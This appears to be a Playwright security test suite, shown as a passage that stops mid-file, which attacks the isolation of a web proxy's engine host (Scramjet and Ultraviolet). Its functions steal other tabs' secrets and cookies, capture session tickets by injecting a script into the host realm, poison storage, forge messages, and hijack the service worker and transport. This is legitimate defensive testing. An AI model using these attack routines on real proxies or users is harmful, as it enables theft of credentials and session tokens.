// Adversarial isolation review of the two-origin engine host (docs/research/spike-engine-host.md §11).
// We act as a MALICIOUS proxied website. Every attack runs as "escaped" code: unrewritten JS in a proxied
// document (Playwright frame.evaluate), standing in for any Scramjet/UV virtualization escape. Escaped code is
// same-origin with the engine host (both the proxy origin), so it reaches the engine host realm through the
// unforgeable window.top[0] (window.top is the cross-origin app; its frames[0] is the engine host).
//
// Parts (SPIKE_ATTACK_PARTS, default all): reach, crosstab, storage, bus, swhijack, baremux, ticket, host-inject,
// handshake, endpoints, popup, webrtc. Engines: SPIKE_ATTACK_ENGINES (default scramjet,ultraviolet).
//
// This suite never restarts the shared proxy server. It judges results from shared server logs, so run.mjs runs it
// one browser at a time, also with --parallel (it is not in PARALLEL_SAFE).
import { TARGET_ORIGIN, TARGET_ORIGIN_ALT, APP_ORIGIN, PROXY_ORIGIN, TICKETS } from '../lib/config.mjs';
import { readOut } from '../lib/drive.mjs';
import { NetWatch, settle, sentinelHost, BROWSER_NOISE } from '../lib/netwatch.mjs';
import { udpSink, STUN_PORT } from './leak.mjs';
import { LEAK_CONSTRUCTS, leakHost, LEAK_DOMAIN } from '../servers/isolation-leak-pages.mjs';

const list = (name, dflt) => (process.env[name] || dflt).split(',').map((s) => s.trim()).filter(Boolean);
const PARTS = new Set(list('SPIKE_ATTACK_PARTS', 'reach,crosstab,storage,bus,swhijack,baremux,ticket,host-inject,handshake,endpoints,popup,webrtc'));
const ENGINES = list('SPIKE_ATTACK_ENGINES', 'scramjet,ultraviolet');
const TRANSPORT = { scramjet: 'libcurl', ultraviolet: 'epoxy' };
const RTC_LOOPBACK = { 'media.peerconnection.ice.loopback': true };
let tabSeq = 300;

const hostOf = (u) => { try { return new URL(u).hostname; } catch { return ''; } };
const uniq = (a) => [...new Set(a)];
// playwright-core + Firefox can hang on frame.evaluate of a tab iframe (transport lane note); cap every one.
const ev = (frame, fn, arg, ms = 30000) => Promise.race([
  frame.evaluate(fn, arg),
  new Promise((_, rej) => setTimeout(() => rej(new Error(`frame.evaluate timed out after ${ms} ms`)), ms)),
]);

async function freshApp(ctx, browser, query) {
  const context = await ctx.newContext(browser);
  const watch = new NetWatch(context, ctx.browser);
  const app = await ctx.openApp(context, query);
  await watch.attachExisting();
  return { context, watch, app };
}

/* ===================================================================== escaped-code attack batteries === */

// (1) Inventory of what escaped code reaches in the engine-host realm (proxy origin), plus ACTUAL theft of a
// second tab's secrets and of proxied-site cookies. Returns short strings / counts only.
async function reachAndTheft(cfg) {
  const out = {};
  const t = async (k, f) => { try { out[k] = await f(); } catch (e) { out[k] = `threw ${e && e.name}: ${String(e && e.message).slice(0, 100)}`; } };
  const H = window.top[0]; // engine host window (same origin)
  await t('engineHostRealm', () => (H.location.pathname === '/engine/' ? `yes: ${H.location.origin}${H.location.pathname}` : `no (${H.location.pathname})`));
  await t('engineHostGlobals', () => ['$scramjet', '$scramjetController', 'BareMux', '__uv$config', '__gnomeEngineHost'].filter((k) => k in H).join(','));
  await t('gnomeEngineHostApi', () => { try { return Object.getOwnPropertyNames(H.__gnomeEngineHost).join(','); } catch (e) { return 'threw ' + e.name; } });
  // Cross-tab reach: other tab iframes live directly under the engine host; same origin => readable.
  await t('otherTabsReadable', () => {
    const frames = [...H.document.querySelectorAll('iframe')];
    let readable = 0;
    const stolen = [];
    for (const f of frames) {
      if (f.contentWindow === window || f.contentWindow === window.parent) continue;
      try {
        const d = f.contentDocument;
        if (!d) continue;
        readable++;
        const secret = d.getElementById && d.getElementById('secret') ? d.getElementById('secret').textContent : null;
        const pw = d.getElementById && d.getElementById('pw') ? d.getElementById('pw').value : null;
        let ls = null; try { ls = f.contentWindow.localStorage.getItem('victim-ls'); } catch (_) { ls = 'ls threw'; }
        let ck = null; try { ck = d.cookie; } catch (_) { ck = 'cookie threw'; }
        if (secret || pw || ls || ck) stolen.push({ secret, pw, ls, cookie: ck });
      } catch (_) { /* cross-origin (escaped to a real site) */ }
    }
    return { frames: frames.length, readable, stolen };
  });
  // Steal proxied sites' cookies from the engine jars reachable on the proxy origin.
  await t('uvCookieStore', () => new Promise((resolve) => {
    let r; try { r = H.indexedDB.open('__op'); } catch (e) { return resolve('open threw ' + e.name); }
    r.onerror = () => resolve('open error');
    r.onsuccess = () => { const db = r.result; if (!db.objectStoreNames.contains('cookies')) { db.close(); return resolve('no cookies store'); } const q = db.transaction('cookies').objectStore('cookies').getAll(); q.onsuccess = () => { db.close(); resolve(q.result.map((c) => `${c.domain}:${c.name}${c.httpOnly ? '(httpOnly)' : ''}=${String(c.value).slice(0, 12)}`)); }; q.onerror = () => resolve('getAll error'); };
  }));
  await t('indexedDbNames', async () => (H.indexedDB.databases ? (await H.indexedDB.databases()).map((d) => d.name).sort().join(',') : 'unsupported'));
  await t('cacheNames', async () => (await H.caches.keys()).join(',') || '(none)');
  await t('swRegistrations', async () => (await H.navigator.serviceWorker.getRegistrations()).map((r) => new URL(r.scope).pathname).join(',') || '(none)');
  await t('hostCookies', () => H.document.cookie || '(none)');
  return out;
}

// (2) Try every way a proxied page could learn or replay the Wisp ticket.
async function ticketExfil(cfg) {
  const out = {};
  const t = async (k, f) => { try { out[k] = await f(); } catch (e) { out[k] = `threw ${e && e.name}: ${String(e && e.message).slice(0, 100)}`; } };
  const H = window.top[0];
  await t('gnomeEngineHostApi', () => Object.getOwnPropertyNames(H.__gnomeEngineHost).join(',')); // only attachDocument?
  await t('hostOwnProps', () => Object.getOwnPropertyNames(H).filter((k) => /ticket|wisp|secret|S$|state/i.test(k)).join(',') || '(none module-scope leaked to window)');
  await t('bareMuxTransportName', async () => { if (!H.BareMux) return 'no BareMux'; const c = new H.BareMux.BareMuxConnection(cfg.bareMuxWorker); return String(await c.getTransport()); });
  await t('rawWispConnectNoTicket', () => new Promise((resolve) => { let ws; try { ws = new H.WebSocket(cfg.proxyWs + '/wisp/'); } catch (e) { return resolve('ctor threw ' + e.name); } const done = (v) => { try { ws.close(); } catch (_) {} resolve(v); }; ws.onopen = () => done('OPENED (no ticket!)'); ws.onerror = () => done('error'); ws.onclose = (e) => done('closed code ' + e.code); setTimeout(() => done('timeout'), 3000); }));
  await t('rawWispGuessTicket', () => new Promise((resolve) => { let ws; try { ws = new H.WebSocket(cfg.proxyWs + '/wisp/?t=' + encodeURIComponent('w1.4102444800.spike0session0ref.guessguessguess')); } catch (e) { return resolve('ctor threw ' + e.name); } const done = (v) => { try { ws.close(); } catch (_) {} resolve(v); }; ws.onopen = () => done('OPENED (guess worked!)'); ws.onerror = () => done('error'); ws.onclose = (e) => done('closed code ' + e.code); setTimeout(() => done('timeout'), 3000); }));
  await t('appTicketEndpoint', async () => { try { const r = await H.fetch(cfg.app + '/api/wisp/ticket', { method: 'POST', credentials: 'include', headers: { 'X-GNOME-Request': '1' } }); return 'status ' + r.status; } catch (e) { return 'threw ' + e.name; } });
  return out;
}

// (3) Poison engine-host storage that is reachable on the proxy origin.
async function storagePoison(cfg) {
  const out = {};
  const t = async (k, f) => { try { out[k] = await f(); } catch (e) { out[k] = `threw ${e && e.name}`; } };
  const H = window.top[0];
  await t('writeHostLocalStorage', () => { H.localStorage.setItem('gnome-attack', 'poisoned'); return H.localStorage.getItem('gnome-attack'); });
  await t('writeCacheStorage', async () => { const c = await H.caches.open('gnome-attack'); await c.put('/poison', new H.Response('x')); return 'wrote ' + (await H.caches.keys()).includes('gnome-attack'); });
  await t('poisonUvCookie', () => new Promise((resolve) => {
    let r; try { r = H.indexedDB.open('__op'); } catch (e) { return resolve('open threw ' + e.name); }
    r.onsuccess = () => { const db = r.result; if (!db.objectStoreNames.contains('cookies')) { db.close(); return resolve('no cookies store (UV not used yet)'); } try { const tx = db.transaction('cookies', 'readwrite'); tx.objectStore('cookies').put({ name: 'attacker', value: 'injected', domain: '.victim.example', path: '/', secure: false, httpOnly: false, id: '.victim.example@/@attacker' }); tx.oncomplete = () => { db.close(); resolve('wrote a cookie for .victim.example into the shared UV jar'); }; tx.onerror = () => { db.close(); resolve('write error'); }; } catch (e) { db.close(); resolve('tx threw ' + e.name); } };
    r.onerror = () => resolve('open error');
  }));
  return out;
}

// (4) Forge engine-host -> app postMessages from a NON-host frame (the app must check event.source).
async function forgeFromNonHostFrame(cfg) {
  const out = {};
  // window.top is the cross-origin app window. Posting to it from THIS proxied frame sets source = this frame,
  // which is NOT the engine iframe.contentWindow, so the app's handshake must reject it.
  try {
    window.top.postMessage({ gnome: 'hello', protocol: 1, build: 'attacker', instance: 'forge-' + Math.random() }, '*');
    out.sentHello = 'posted a forged hello to the app from a proxied (non-host) frame';
  } catch (e) { out.sentHello = 'threw ' + e.name; }
  try {
    window.top.postMessage({ k: 'evt', type: 'tab.committed', p: { tabId: 1, url: 'https://bank.example/login', engine: 'scramjet', canGoBack: false, canGoForward: false, kind: 'navigate' } }, '*');
    out.sentEvt = 'posted a forged tab.committed to the app';
  } catch (e) { out.sentEvt = 'threw ' + e.name; }
  return out;
}

// (5) Inject a script into the engine-host realm (same origin): run AS the host, forge a hello so the app
// re-handshakes, capture the fresh MessagePort, and eavesdrop the init/ticket command => steal the ticket and
// gain the ability to forge any engine->app event. This is the "escape == full host compromise" demonstration.
async function hostRealmInjection(cfg) {
  const out = {};
  const H = window.top[0];
  try {
    H.__attack = { ran: false, gotPort: false, captured: [] };
    const s = H.document.createElement('script');
    s.textContent =
      '(function(){var A=window.__attack;A.ran=true;' +
      'window.addEventListener("message",function(e){try{' +
      'if(e.data&&e.data.gnome==="connect"&&e.ports&&e.ports[0]){A.gotPort=true;var p=e.ports[0];' +
      'p.addEventListener("message",function(ev){var m=ev.data;if(m&&m.k==="cmd"&&(m.type==="init"||m.type==="ticket")){' +
      'var tk=m.type==="init"?(m.p&&m.p.ticket&&m.p.ticket.value):(m.p&&m.p.value);A.captured.push({type:m.type,ticket:tk});}});p.start();}' +
      '}catch(_){}},true);' +
      // Forge a hello: this postMessage runs in the HOST realm, so source===iframe.contentWindow and the app accepts it.
      'window.parent.postMessage({gnome:"hello",protocol:1,build:"attacker",instance:"inj-"+Math.random()},"*");' +
      '})();';
    H.document.head.appendChild(s);
    out.ran = H.__attack.ran;
  } catch (e) { out.injectError = String(e.name) + ': ' + String(e.message).slice(0, 80); }
  return out;
}
async function readInjectionResult() {
  try { const H = window.top[0]; return H.__attack || null; } catch (e) { return { error: String(e.name) }; }
}

/* ============================================================================================ bus poison === */
// A proxied page joins the engine BroadcastChannel and disables the GNOME leak CSP (UV path) by posting sw-config.
async function postBusCspOff() {
  const H = window.top[0];
  const bc = new H.BroadcastChannel('gnome-engine');
  bc.postMessage({ type: 'sw-config', config: { csp: 'off', cspPolicy: '' } });
  // spam it so a host re-push does not immediately overwrite
  const iv = setInterval(() => bc.postMessage({ type: 'sw-config', config: { csp: 'off', cspPolicy: '' } }), 150);
  setTimeout(() => { clearInterval(iv); bc.close(); }, 4000);
  return 'posted sw-config csp:off to gnome-engine';
}
// Spoof host<-SW signals: a fake wisp close (trigger recovery/needTicket) and a fake download.
async function postBusSpoof(cfg) {
  const H = window.top[0];
  const bc = new H.BroadcastChannel('gnome-engine');
  bc.postMessage({ type: 'wisp', side: 'scramjet', ev: 'close', wasOpen: true, code: 1006, url: 'wss://redacted/wisp/?t=<ticket>' });
  bc.postMessage({ type: 'download', phase: 'started', id: 'attacker-dl', url: 'http://127.0.0.1/malware.exe', filename: 'invoice.pdf.exe', mime: 'application/octet-stream', total: 1000, referrer: cfg.target + '/iso/probe' });
  bc.close();
  return 'posted fake wisp-close + download to gnome-engine';
}

/* ================================================================================================ engineRun === */
async function engineRun(ctx, browser, engine, sink) {
  const rec = (test, result, notes, data) => ctx.record({ engine, transport: TRANSPORT[engine], test, result, notes, data });
  // --- reach + cross-tab theft + storage read, with a victim tab loaded first on another site
  if (PARTS.has('reach') || PARTS.has('crosstab') || PARTS.has('storage') || PARTS.has('ticket')) {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', fallback: '0' });
    try {
      const v = await app.navigate(2, `${TARGET_ORIGIN_ALT}/iso/victim`, { create: true, engine, timeout: 45000 });
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      await readOut(app, 1, 20000);
      const frame = app.tabFrame(1);
      if (!frame || !a.ok) { rec('setup', 'fail', `probe/victim load failed: probe ${JSON.stringify(a.error).slice(0, 120)}, victim ${v.ok}`); }
      else {
        const cfg = { app: APP_ORIGIN, proxy: PROXY_ORIGIN, proxyWs: PROXY_ORIGIN.replace('http', 'ws'), target: TARGET_ORIGIN, bareMuxWorker: '/vendor/bare-mux/worker.js' };
        if (PARTS.has('reach') || PARTS.has('crosstab')) {
          const r = await ev(frame, reachAndTheft, cfg);
          const ot = r.otherTabsReadable || {};
          const stole = ot.stolen && ot.stolen.length && (ot.stolen[0].secret || ot.stolen[0].pw || ot.stolen[0].ls);
          rec('crosstab:read-other-tab', stole ? 'fail' : 'pass', `engine host realm: ${r.engineHostRealm}; other tabs ${JSON.stringify(ot).slice(0, 220)}`, r);
          rec('reach:proxy-origin-facilities', 'pass', `globals ${r.engineHostGlobals}; __gnomeEngineHost=[${r.gnomeEngineHostApi}]; idb=${r.indexedDbNames}; caches=${r.cacheNames}; SW=${r.swRegistrations}; hostCookies=${String(r.hostCookies).slice(0, 80)}`, r);
          if (PARTS.has('storage')) rec('storage:read-proxied-cookies', /httpOnly/.test(String(r.uvCookieStore)) ? 'fail' : (Array.isArray(r.uvCookieStore) && r.uvCookieStore.length ? 'partial' : 'pass'), `UV __op cookie store read by a proxied page: ${JSON.stringify(r.uvCookieStore).slice(0, 220)}`, { uv: r.uvCookieStore });
        }
        if (PARTS.has('storage')) {
          const p = await ev(frame, storagePoison, cfg);
          const poisoned = /wrote/.test(String(p.poisonUvCookie)) || p.writeHostLocalStorage === 'poisoned';
          rec('storage:poison-engine-host', poisoned ? 'fail' : 'pass', `localStorage=${p.writeHostLocalStorage}; cacheStorage=${p.writeCacheStorage}; UV jar=${p.poisonUvCookie}`, p);
        }
        if (PARTS.has('ticket')) {
          const tk = await ev(frame, ticketExfil, cfg);
          const got = Object.values(tk).some((v2) => /OPENED|^w1\./.test(String(v2)));
          rec('ticket:exfil-by-proxied-page', got ? 'fail' : 'pass', `host props=[${tk.hostOwnProps}]; __gnomeEngineHost=[${tk.gnomeEngineHostApi}]; bareMux transport name=${String(tk.bareMuxTransportName).slice(0, 80)}; raw wisp no-ticket=${tk.rawWispConnectNoTicket}; guess=${tk.rawWispGuessTicket}; app ticket endpoint=${tk.appTicketEndpoint}`, tk);
        }
      }
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- forge engine->app messages from a non-host frame (app source check)
  if (PARTS.has('handshake')) {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', fallback: '0' });
    try {
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      const frame = app.tabFrame(1);
      const connectsBefore = await app.gnome(() => window.gnomeTest.connects);
      const rejectedBefore = await app.gnome(() => window.gnomeTest.rejected.length);
      if (frame && a.ok) await ev(frame, forgeFromNonHostFrame, {});
      await ctx.sleep(1500);
      const after = await app.gnome(() => ({ connects: window.gnomeTest.connects, rejected: window.gnomeTest.rejected.length, title: document.getElementById('title').textContent }));
      const held = after.connects === connectsBefore && !/bank\.example/.test(after.title || '');
      rec('handshake:forge-from-non-host-frame', held ? 'pass' : 'fail', `app connects ${connectsBefore}->${after.connects} (unchanged=${after.connects === connectsBefore}); rejected ${rejectedBefore}->${after.rejected}; title ${JSON.stringify(after.title)}`, after);
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- host-realm script injection => MessagePort capture => ticket theft (DESTRUCTIVE: own context)
  if (PARTS.has('host-inject')) {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', fallback: '0' });
    try {
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      await readOut(app, 1, 20000);
      const frame = app.tabFrame(1);
      if (frame && a.ok) {
        const inj = await ev(frame, hostRealmInjection, { app: APP_ORIGIN });
        await ctx.sleep(3000); // let the app re-handshake and send init/ticket
        const res = await ev(frame, readInjectionResult).catch((e) => ({ error: String(e.message || e) }));
        const stolen = res && Array.isArray(res.captured) && res.captured.find((c) => c.ticket);
        const realTicket = stolen && (stolen.ticket === TICKETS.first || /^w1\./.test(String(stolen.ticket)));
        rec('host-inject:steal-ticket-via-port', realTicket ? 'fail' : (res && res.gotPort ? 'partial' : 'pass'),
          `injected into engine-host realm: ran=${inj.ran}; captured a MessagePort=${res && res.gotPort}; intercepted commands=${JSON.stringify((res && res.captured) || []).slice(0, 200)}; stolen ticket matches real=${!!realTicket}`, { inj, res });
      } else rec('host-inject:steal-ticket-via-port', 'fail', `probe did not load: ${JSON.stringify(a.error).slice(0, 120)}`);
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- bus poison: disable the UV leak CSP, then load a leaky page and watch for native egress
  if (PARTS.has('bus')) {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', csp: 'enforce', fallback: '0' });
    try {
      // attacker tab
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      const frame = app.tabFrame(1);
      let posted = 'frame missing';
      let spoof = 'frame missing';
      const connectsBefore = await app.gnome(() => window.gnomeTest.connects).catch(() => null);
      const sinceSeq = await app.mark().catch(() => 0);
      if (frame && a.ok) {
        posted = await ev(frame, postBusCspOff).catch((e) => 'threw ' + e.name);
        spoof = await ev(frame, postBusSpoof, { target: TARGET_ORIGIN }).catch((e) => 'threw ' + e.name);
      }
      await ctx.sleep(600);
      // Now load a fresh leaky page: with the CSP poisoned off, UV documents leak natively.
      const tabId = ++tabSeq;
      const m = watch.mark();
      const t0 = Date.now();
      const r = await app.navigate(tabId, `${TARGET_ORIGIN}/leak/matrix`, { create: true, engine, timeout: 45000 });
      await readOut(app, tabId, 15000);
      await settle(watch, { quietMs: 2000, maxMs: 10000 });
      const natives = watch.natives(m).filter((n) => hostOf(n.url).endsWith(LEAK_DOMAIN) && n.blockedReason !== 'csp' && !/CSP/i.test(String(n.failure || n.errorText || '')));
      const sentinel = ctx.eventsSince(t0, 'sentinel').map((e) => sentinelHost(e)).filter((h) => h.endsWith(LEAK_DOMAIN));
      const leaked = uniq([...natives.map((n) => hostOf(n.url)), ...sentinel]);
      // did the spoofed signals reach the app?
      const evts = await app.eventsSince(sinceSeq).catch(() => []);
      const fakeDownload = evts.some((e) => e.type === 'download.started' && /invoice/.test(String(e.p && e.p.filename)));
      rec('bus:disable-leak-csp', leaked.length ? 'fail' : 'partial', `${posted}; after poisoning csp:off a ${engine} leak page emitted native requests to: [${leaked.slice(0, 8).join(' ') || 'none'}]. The SW takes its config only from the engine-host client's postMessage (the gnome-engine BroadcastChannel path is off unless the run sets swConfigBus=1 to reproduce the session-3 hole) and Scramjet from host module state, so the forged csp:off is ignored by default. The bus itself stays attacker-writable (see bus:spoof-host-signals): production hard-wires the SW policy and never reads a BroadcastChannel.`, { leaked, loaded: r.ok });
      rec('bus:spoof-host-signals', fakeDownload ? 'fail' : 'partial', `${spoof}; app showed a forged download=${fakeDownload}; app connects ${connectsBefore}->${await app.gnome(() => window.gnomeTest.connects).catch(() => '?')}`, { fakeDownload });
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- service worker hijack: unregister GNOME's /sw.js => proxying breaks (DESTRUCTIVE: own context)
  if (PARTS.has('swhijack')) {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', fallback: '0' });
    try {
      const warm = await app.navigate(1, `${TARGET_ORIGIN}/`, { create: true, engine, timeout: 45000 });
      const frame = app.tabFrame(1);
      let unreg = 'frame missing';
      if (frame && warm.ok) {
        unreg = await ev(frame, async () => {
          const H = window.top[0];
          const regs = await H.navigator.serviceWorker.getRegistrations();
          const results = [];
          for (const r of regs) results.push({ scope: new URL(r.scope).pathname, unregistered: await r.unregister() });
          return results;
        }).catch((e) => 'threw ' + e.name);
      }
      await ctx.sleep(800);
      // A new navigation now has no SW: Scramjet /~/sj/ reaches the server 503, UV /uv/service/ falls through.
      const after = await app.navigate(++tabSeq, `${TARGET_ORIGIN}/title-change`, { create: true, engine, timeout: 25000 });
      const brokeProxy = !after.ok;
      rec('swhijack:unregister-gnome-sw', brokeProxy ? 'fail' : 'pass', `unregister result ${JSON.stringify(unreg).slice(0, 160)}; a later navigation ${after.ok ? 'still loaded (SW re-registered?)' : 'FAILED (' + JSON.stringify(after.error).slice(0, 90) + ')'}`, { unreg, after: after.error });
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- bare-mux transport replacement (UV): any same-origin code can replace the shared SharedWorker transport
  if (PARTS.has('baremux') && engine === 'ultraviolet') {
    const { context, watch, app } = await freshApp(ctx, browser, { route: 'test', fallback: '0' });
    try {
      const warm = await app.navigate(1, `${TARGET_ORIGIN}/`, { create: true, engine, timeout: 45000 });
      const frame = app.tabFrame(1);
      let replaced = 'frame missing';
      if (frame && warm.ok) {
        replaced = await ev(frame, async (workerPath) => {
          const H = window.top[0];
          if (!H.BareMux) return 'no BareMux global';
          try {
            const c = new H.BareMux.BareMuxConnection(workerPath);
            const before = await c.getTransport();
            // Replace the globally-shared transport with a dead one: breaks ALL UV proxying in this origin.
            await c.setManualTransport('return [class{ async init(){} async request(){ throw new Error("hijacked by attacker"); } async connect(){ throw new Error("hijacked"); } ready=true },"attacker"];', []);
            return { before, after: await c.getTransport() };
          } catch (e) { return 'threw ' + e.name + ': ' + String(e.message).slice(0, 80); }
        }, '/vendor/bare-mux/worker.js').catch((e) => 'threw ' + e.name);
      }
      await ctx.sleep(500);
      const after = await app.navigate(++tabSeq, `${TARGET_ORIGIN}/title-change`, { create: true, engine, timeout: 25000 });
      const hijacked = !after.ok && typeof replaced === 'object';
      rec('baremux:replace-shared-transport', hijacked ? 'fail' : 'pass', `getTransport before/after: ${JSON.stringify(replaced).slice(0, 160)}; a later UV navigation ${after.ok ? 'still loaded' : 'FAILED (' + JSON.stringify(after.error).slice(0, 90) + ')'}`, { replaced, after: after.error });
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }

  // --- WebRTC: measure the leak, then prove the document-start kill switch (modeled via an init script)
  if (PARTS.has('webrtc')) await webrtcRun(ctx, browser, engine, sink, rec);
}

/* ================================================================================================= webrtc === */
// The kill switch a real engine host would install at document start (Scramjet init.pre / UV document-start hook)
// and in its own realm: neutralize RTCPeerConnection in every PROXIED document and the engine-host realm, but NOT
// in native about:blank realms a page conjures (the hook cannot reach those) - so this faithfully leaves the
// escaped blank-iframe path open, matching what a real engine host can and cannot do.
function webrtcKillSwitchInitScript() {
  try {
    // Only neutralize realms the engine host owns: the engine host doc and proxied docs (proxy-origin, non-blank).
    const href = location.href;
    if (href === 'about:blank' || href === '') return; // a native blank realm: the engine host cannot reach it
    if (!/\/engine\/$|\/~\/sj\/|\/uv\/service\//.test(location.pathname)) return;
    for (const n of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection']) {
      try { Object.defineProperty(window, n, { configurable: true, writable: true, value: undefined }); } catch (_) {}
    }
  } catch (_) { /* never break the page */ }
}

async function rtcFromProxiedPage({ stun }) {
  if (typeof RTCPeerConnection !== 'function') return 'RTCPeerConnection absent (killed)';
  const pc = new RTCPeerConnection({ iceServers: [{ urls: stun }] });
  pc.createDataChannel('x');
  await pc.setLocalDescription(await pc.createOffer());
  await new Promise((r) => setTimeout(r, 1500));
  const n = (pc.localDescription?.sdp || '').split('\n').filter((l) => l.startsWith('a=candidate')).length;
  pc.close();
  return `available; ${n} candidates`;
}
async function rtcEscapedPaths({ stun }) {
  const out = {};
  const t = async (k, f) => { try { out[k] = await f(); } catch (e) { out[k] = `threw ${e && e.name}`; } };
  const H = window.top[0];
  await t('ownRealm', () => (typeof RTCPeerConnection === 'function' ? 'available' : 'killed'));
  await t('engineHostRealm', () => (typeof H.RTCPeerConnection === 'function' ? 'available' : 'killed'));
  await t('blankIframeRealm', async () => {
    const f = document.createElement('iframe'); document.body.appendChild(f);
    const w = f.contentWindow;
    if (typeof w.RTCPeerConnection !== 'function') return 'killed';
    const pc = new w.RTCPeerConnection({ iceServers: [{ urls: stun }] });
    pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer());
    await new Promise((r) => setTimeout(r, 1200));
    const n = (pc.localDescription?.sdp || '').split('\n').filter((l) => l.startsWith('a=candidate')).length;
    pc.close();
    return `available; ${n} candidates (fresh native realm the engine host cannot reach)`;
  });
  return out;
}

async function webrtcRun(ctx, browser, engine, sink, rec) {
  // Control: no kill switch -> ordinary proxied page leaks STUN directly.
  for (const mode of ['off', 'killswitch']) {
    const context = await ctx.newContext(browser);
    if (mode === 'killswitch') await context.addInitScript(webrtcKillSwitchInitScript);
    const watch = new NetWatch(context, ctx.browser);
    try {
      const app = await ctx.openApp(context, { route: 'test', fallback: '0' });
      await watch.attachExisting();
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      await readOut(app, 1, 20000);
      const frame = app.tabFrame(1);
      if (!frame || !a.ok) { rec(`webrtc:${mode}`, 'fail', `probe did not load: ${JSON.stringify(a.error).slice(0, 120)}`); }
      else {
        const before = sink.packets.length;
        const page = await ev(frame, rtcFromProxiedPage, { stun: sink.url }).catch((e) => 'threw ' + e.name);
        await ctx.sleep(500);
        const pagePkts = sink.packets.length - before;
        const before2 = sink.packets.length;
        const esc = await ev(frame, rtcEscapedPaths, { stun: sink.url }).catch((e) => ({ error: String(e.message || e) }));
        await ctx.sleep(500);
        const escPkts = sink.packets.length - before2;
        if (mode === 'off') {
          rec('webrtc:off:proxied-page', pagePkts > 0 ? 'fail' : 'pass', `ordinary proxied page: ${page}; STUN packets to the local sink: ${pagePkts} (direct, outside Wisp)`, { page, pagePkts });
        } else {
          rec('webrtc:killswitch:proxied-page', pagePkts === 0 && /killed|absent/.test(String(page)) ? 'pass' : 'fail', `with the document-start kill switch: ${page}; STUN packets: ${pagePkts}`, { page, pagePkts });
          rec('webrtc:killswitch:escaped-code', escPkts === 0 ? 'pass' : 'partial', `escaped code: own realm ${esc.ownRealm}, engine-host realm ${esc.engineHostRealm}, blank-iframe realm ${esc.blankIframeRealm}; STUN packets ${escPkts} (the fresh native realm path survives; needs a transport/connection-level block)`, { esc, escPkts });
        }
      }
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await watch.close(); await context.close(); }
  }
}

/* ========================================================================= app-level parts (once) === */
// Proxy-origin endpoint exposure: a proxied page is SAME-ORIGIN with /api/health and /api/filters.
async function endpointExposure(ctx, browser) {
  const context = await ctx.newContext(browser);
  try {
    const app = await ctx.openApp(context, { route: 'test', fallback: '0' });
    const engine = ENGINES[0];
    const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
    await readOut(app, 1, 20000);
    const frame = app.tabFrame(1);
    if (!frame || !a.ok) { ctx.record({ test: 'endpoints:proxy-origin', result: 'fail', notes: 'probe did not load' }); return; }
    const res = await ev(frame, async () => {
      const H = window.top[0];
      const get = async (p) => { try { const r = await H.fetch(p, { cache: 'no-store' }); return { status: r.status, body: (await r.text()).slice(0, 400) }; } catch (e) { return { error: String(e.name) }; } };
      return { health: await get('/api/health'), filters: await get('/api/filters'), config: await get('/api/config') };
    });
    const h = res.health.body || '';
    const leaks = ['version', 'uptime', 'wisp'].filter((k) => h.includes(k));
    ctx.record({ test: 'endpoints:proxy-origin-health', result: leaks.length ? 'partial' : 'pass', notes: `GET /api/health (readable by any proxied page, same origin) exposes: [${leaks.join(',')}]; body ${h.slice(0, 180)}`, data: res });
    ctx.record({ test: 'endpoints:proxy-origin-filters', result: 'pass', notes: `GET /api/filters status ${res.filters.status}; /api/config status ${res.config.status} (expected 404 on the proxy origin)`, data: { filters: res.filters, config: res.config } });
  } finally { for (const p of context.pages()) await p.close().catch(() => {}); await context.close(); }
}

// Popups: with the default sandbox a popup escapes; without allow-popups window.open is neutered (OAuth breaks).
async function popupEscape(ctx, browser) {
  const engine = ENGINES[0];
  // (a) default sandbox: escaped window.open reaches the network directly (sentinel sees it).
  {
    const context = await ctx.newContext(browser);
    const watch = new NetWatch(context, ctx.browser);
    try {
      const app = await ctx.openApp(context, { route: 'test', fallback: '0' });
      await watch.attachExisting();
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      await readOut(app, 1, 20000);
      const frame = app.tabFrame(1);
      const t0 = Date.now();
      let opened = 'frame missing';
      if (frame && a.ok) opened = await ev(frame, ({ host }) => { const H = window.top[0]; const w = H.open(host, '_blank'); return w ? 'opened a window' : 'null'; }, { host: `https://leak-popup.${LEAK_DOMAIN}/x` }).catch((e) => 'threw ' + e.name);
      await ctx.sleep(1500);
      const sentinel = ctx.eventsSince(t0, 'sentinel').map((e) => sentinelHost(e)).filter((h) => h.includes('leak-popup'));
      ctx.record({ test: 'popup:default-sandbox-escapes', result: sentinel.length ? 'fail' : 'pass', notes: `allow-popups-to-escape-sandbox: window.open(${'leak-popup'}) -> ${opened}; sentinel saw the popup reach the net directly: ${sentinel.length > 0} [${uniq(sentinel).join(' ')}]`, data: { opened, sentinel: uniq(sentinel) } });
      for (const p of context.pages()) if (p !== app.page) await p.close().catch(() => {});
    } finally { await watch.close(); await context.close(); }
  }
